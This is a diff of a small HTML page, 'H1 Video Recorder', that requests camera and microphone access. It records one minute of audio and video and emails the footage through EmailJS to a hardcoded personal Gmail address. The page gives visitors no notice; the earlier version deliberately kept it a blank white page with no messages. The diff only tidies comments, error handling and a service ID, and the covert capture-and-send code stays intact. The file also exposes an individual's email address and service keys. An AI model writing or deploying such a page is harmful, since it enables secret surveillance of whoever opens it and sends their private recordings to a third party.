@@ -4,24 +4,17 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>H1 Video Recorder</title>
-  <style>
-    /* Make body fully white with no margin */
-    body {
-      margin: 0;
-      background: white;
-      height: 100vh;
-      overflow: hidden;
-    }
-  </style>
 </head>
 <body>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
-    emailjs.init("ACOn6PC1Zb70JrmxT"); // Your EmailJS Public Key
+    // Initialize EmailJS with your public key
+    emailjs.init("ACOn6PC1Zb70JrmxT");
 
     async function startRecording() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+
         const recorder = new MediaRecorder(stream);
         const chunks = [];
 
@@ -32,9 +25,11 @@
           const reader = new FileReader();
 
           reader.onloadend = function() {
+            // Convert to base64 (remove data prefix)
             const base64data = reader.result.split(',')[1];
 
-            emailjs.send("service_p3yitzn", "template_oyrsayr", {
+            // Send email with attachment
+            emailjs.send("service_khmk344", "template_oyrsayr", {
               to_email: "julianlee252@gmail.com",
               message: "Here’s your 1-minute video recording."
             }, {
@@ -43,9 +38,10 @@
                 data: base64data
               }]
             }).then(() => {
-              // No alerts or messages, remain blank
-            }, (error) => {
-              console.error("EmailJS error:", error);
+              // Email sent successfully
+              // You can add something here if you want
+            }).catch(error => {
+              console.error("❌ EmailJS error:", error);
             });
           };
 
@@ -57,10 +53,10 @@
         setTimeout(() => {
           recorder.stop();
           stream.getTracks().forEach(track => track.stop());
-        }, 60000);
+        }, 60000); // 1 minute
 
       } catch (err) {
-        console.error("Permission or recording error:", err);
+        console.error("Permission denied or error:", err);
       }
     }
 
